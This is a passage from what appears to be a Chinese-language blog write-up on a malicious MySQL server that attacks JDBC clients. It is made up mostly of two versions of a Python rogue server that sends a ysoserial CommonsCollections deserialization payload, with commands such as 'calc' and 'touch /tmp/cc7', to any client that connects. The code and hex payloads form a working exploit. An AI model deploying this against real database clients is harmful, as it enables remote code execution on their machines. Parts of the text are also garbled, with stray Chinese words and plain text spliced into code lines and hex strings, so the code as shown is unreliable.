+</span></span><span style="display:flex;"><span>greeting_data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&#34;</span>
+</span></span><span style="display:flex;"><span>response_ok_data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0700000200000002000000&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">receive_data</span>(conn):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Receiveing the package : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(data))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str(data)<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_data</span>(conn,data):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Sending the package : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(data))
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(binascii<span style="color:#f92672">.</span>a2b_hex(data))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_payload_content</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &#34;calc&#34; &gt; a </span>
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;a&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            payload_content <span style="color:#f92672">=</span> str(binascii<span style="color:#f92672">.</span>b2a_hex(f<span style="color:#f92672">.</span>read()),encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;open successs&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;open false&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#calc</span>
+</span></span><span style="display:flex;"><span>        payload_content<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload_content
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 主要逻辑</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        conn, addr <span style="color:#f92672">=</span> sk<span style="color:#f92672">.</span>accept()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Connection come from </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(addr[<span style="color:#ae81ff">0</span>],addr[<span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 1.先发送第一个 问候报文</span>
+</span></span><span style="display:flex;"><span>        send_data(conn,greeting_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>
+</span></span><span style="display:flex;"><span>            receive_data(conn)
+</span></span><span style="display:flex;"><span>            send_data(conn,response_ok_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#其他过程</span>
+</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#查询一些配置信息,其中会发送自己的 版本号</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;session.auto_increment_increment&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                _payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c21的0009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn,_payload)
+</span></span><span style="display:flex;"><span>                data<span style="color:#f92672">=</span>receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;show warnings&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                _payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, _payload)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;set names&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                send_data(conn, response_ok_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;set character_set_results&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                send_data(conn, response_ok_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;show session status&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0100000102&#39;</span>
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#39;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 为什么我加了EOF Packet 就无法正常运行呢？？</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 获取payload</span>
+</span></span><span style="display:flex;"><span>                payload_content<span style="color:#f92672">=</span>get_payload_content()
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 计算payload长度</span>
+</span></span><span style="display:flex;"><span>                payload_length <span style="color:#f92672">=</span> str(hex(len(payload_content)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>                payload_length_hex <span style="color:#f92672">=</span> payload_length[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> payload_length[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># 计算数据包长度</span>
+</span></span><span style="display:flex;"><span>                data_len <span style="color:#f92672">=</span> str(hex(len(payload_content)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>                data_len_hex <span style="color:#f92672">=</span> data_len[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> data_len[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> data_len[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> data_len_hex <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;04&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;fbfc&#39;</span><span style="color:#f92672">+</span> payload_length_hex
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> str(payload_content)
+</span></span><span style="display:flex;"><span>                mysql_data <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;07000005fe000022000100&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, mysql_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;show warnings&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535show session status441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, payload)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    HOST <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>
+</span></span><span style="display:flex;"><span>    PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">3309</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sk <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>bind((HOST, PORT))
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;start fake mysql server listening on </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(HOST,PORT))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    run()
+</span></span></code></pre></div><p>经过之前的分析，这个脚本是不难看懂的，但是该工具在我这里使用的时候无法复现，原因在于<code>show session status</code>之后发送的payload有误，那怎么办呢？毕竟要修改这部分代码是需要对mysql发送的数据包格式进行一个系统的了解和认识的，关于数据包格式，在https://xz.aliyun.com/t/8159#toc-1 这篇文章中有分析到，但我无意对数据包格式作深究，于是用了一个比较偷懒的办法。</p>
+<p>还记得之前用jdbc将payload请求回本地并进行手动反序列化时候的操作吗，我们可以从wireshark中将那个数据包中的数据copy下来，删除mysql数据以外的数据，然后加入到脚本中，那么脚本进过修改之后如下所示。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># -*- coding:utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#@Time : 2020/7/27 2:10</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#@Author: Tri0mphe7</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#@File : server.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>greeting_data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&#34;</span>
+</span></span><span style="display:flex;"><span>response_ok_data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0700000200000002000000&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">receive_data</span>(conn):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Receiveing the package : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(data))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> str(data)<span style="color:#f92672">.</span>lower()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_data</span>(conn,data):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Sending the package : </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(data))
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(binascii<span style="color:#f92672">.</span>a2b_hex(data))朋友他好哦你
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 主要逻辑</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        conn, addr <span style="color:#f92672">=</span> sk<span style="color:#f92672">.</span>accept()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Connection come from </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(addr[<span style="color:#ae81ff">0</span>],addr[<span style="color:#ae81ff">1</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 1.先发送第一个 问候报文</span>
+</span></span><span style="display:flex;"><span>        send_data(conn,greeting_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span>
+</span></span><span style="display:flex;"><span>            receive_data(conn)
+</span></span><span style="display:flex;"><span>            send_data(conn,response_ok_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#其他过程</span>
+</span></span><span style="display:flex;"><span>            data<span style="color:#f92672">=</span>receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#查询一些配置信息,其中会发送自己的 版本号</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;session.auto_increment_increment&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                _payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn,_payload)
+</span></span><span style="display:flex;"><span>                data<span style="color:#f92672">=</span>receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;show warnings&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                _payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, _payload)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;set names&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                send_data(conn, response_ok_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;set character_set_results&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                send_data(conn, response_ok_data)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;show session status&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                mydata <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000001013800000203646566087365637572697479096576696c7461626c65096576696c7461626c65046576696c046576696c0c3f00ffff0000fc900000000003050003fc0005aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d000000027807000004fe000022000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, mydata)
+</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> receive_data(conn)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;show warnings&#34;</span> <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#39;</span>
+</span></span><span style="display:flex;"><span>                send_data(conn, payload)
